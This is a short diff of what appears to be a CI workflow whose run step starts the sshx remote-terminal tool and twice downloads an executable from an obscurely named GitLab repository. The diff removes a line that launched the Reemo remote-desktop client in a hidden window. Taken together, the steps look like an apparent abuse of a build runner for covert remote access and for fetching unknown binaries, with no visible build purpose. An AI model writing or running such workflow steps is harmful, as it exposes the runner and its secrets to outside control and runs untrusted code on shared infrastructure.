@@ -15,7 +15,6 @@ jobs:
     - name: run
       run: |
            start sshx.exe
-           Start-Process "C:\Program Files\Reemo\Reemo.exe" -WindowStyle Hidden
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
            sleep 240
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
